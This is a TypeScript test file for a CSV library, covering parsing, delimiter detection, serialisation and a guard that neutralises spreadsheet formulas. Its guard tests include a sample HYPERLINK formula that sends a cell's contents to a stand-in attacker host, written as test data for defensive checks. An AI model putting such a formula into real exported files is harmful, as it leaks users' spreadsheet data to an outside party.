import assert from 'node:assert/strict';
import { describe, it } from 'node:test';
import { detectDelimiter, neutralizeFormula, parseCsv, serializeCsv } from '../src/csv.js';
import { UsageError } from '../src/errors.js';

describe('parseCsv', () => {
  it('reads quoted fields, doubled quotes, delimiters and line breaks inside quotes', () => {
    const table = parseCsv('name,note\r\n"Quill, Ada","said ""hi""\nthen left"\r\nBruno,plain\r\n');
    assert.deepEqual(table.headers, ['name', 'note']);
    assert.deepEqual(table.rows, [
      ['Quill, Ada', 'said "hi"\nthen left'],
      ['Bruno', 'plain'],
    ]);
    assert.equal(table.delimiter, ',');
  });

  it('strips a byte order mark, trims header names and drops blank lines', () => {
    const table = parseCsv('﻿ Full name , Email \n\nAda Quill,ada@northwind-labs.example\n,\n\n');
    assert.deepEqual(table.headers, ['Full name', 'Email']);
    assert.deepEqual(table.rows, [['Ada Quill', 'ada@northwind-labs.example']]);
  });

  it('sniffs semicolons and tabs, and takes a forced delimiter', () => {
    assert.equal(detectDelimiter('a;b;c\n1;2;3'), ';');
    assert.equal(detectDelimiter('a\tb\n1\t2'), '\t');
    assert.equal(detectDelimiter('"a;b",c\n'), ',');
    assert.equal(parseCsv('a;b\n1;2\n').delimiter, ';');
    assert.deepEqual(parseCsv('a;b\n1;2\n', { delimiter: ',' }).rows, [['1;2']]);
  });

  it('pads short rows and drops empty trailing fields', () => {
    const table = parseCsv('a,b,c\n1\n1,2,3,,\n');
    assert.deepEqual(table.rows, [
      ['1', '', ''],
      ['1', '2', '3'],
    ]);
  });

  it('refuses real values past the header, an open quote and a file without data rows', () => {
    assert.throws(() => parseCsv('a,b\n1,2,3\n'), UsageError);
    assert.throws(() => parseCsv('a,b\n"1,2\n'), UsageError);
    assert.throws(() => parseCsv('a,b\n'), UsageError);
    assert.throws(() => parseCsv(''), UsageError);
  });
});

describe('serializeCsv', () => {
  it('quotes only what needs quotes and ends every line with CRLF', () => {
    const text = serializeCsv(['a', 'b'], [['x,y', 'say "hi"'], [' lead', 'line\nbreak'], ['plain', '']]);
    assert.equal(text, 'a,b\r\n"x,y","say ""hi"""\r\n" lead","line\nbreak"\r\nplain,\r\n');
  });

  it('round-trips through parseCsv, with any delimiter', () => {
    const headers = ['Full name', 'Note'];
    const rows = [
      ['Ada Quill', 'one; two, "three"'],
      ['Chen Ito', ''],
    ];
    for (const delimiter of [',', ';', '\t', '|'] as const) {
      const table = parseCsv(serializeCsv(headers, rows, delimiter), { delimiter });
      assert.deepEqual(table.headers, headers);
      assert.deepEqual(table.rows, rows);
    }
  });
});

describe('neutralizeFormula', () => {
  it('puts an apostrophe before each first character a spreadsheet starts a formula with', () => {
    const risky = ['=1+1', '+1+1', '-1+1', '@SUM(A1:A9)', '\t=1+1', '\r=1+1', '=HYPERLINK("https://evil.example/?d="&A2,"Open")'];
    for (const value of risky) assert.equal(neutralizeFormula(value), `'${value}`, JSON.stringify(value));
  });

  it('returns every other value unchanged', () => {
    const plain = ['', 'ada@northwind-labs.example', 'done', 'catch_all', '95', '0.5', 'not_found', 'cr_pp_ada000000001', 'a=b', 'x-y'];
    for (const value of plain) assert.equal(neutralizeFormula(value), value, JSON.stringify(value));
  });

  it('keeps the guard through CSV quoting: the written cell starts with the apostrophe', () => {
    const value = neutralizeFormula('=HYPERLINK("https://evil.example/","Open")');
    const text = serializeCsv(['enrichment_result'], [[value]]);
    assert.equal(text.split('\r\n')[1], `"'=HYPERLINK(""https://evil.example/"",""Open"")"`);
    assert.equal(parseCsv(text).rows[0]?.[0], value);
  });
});
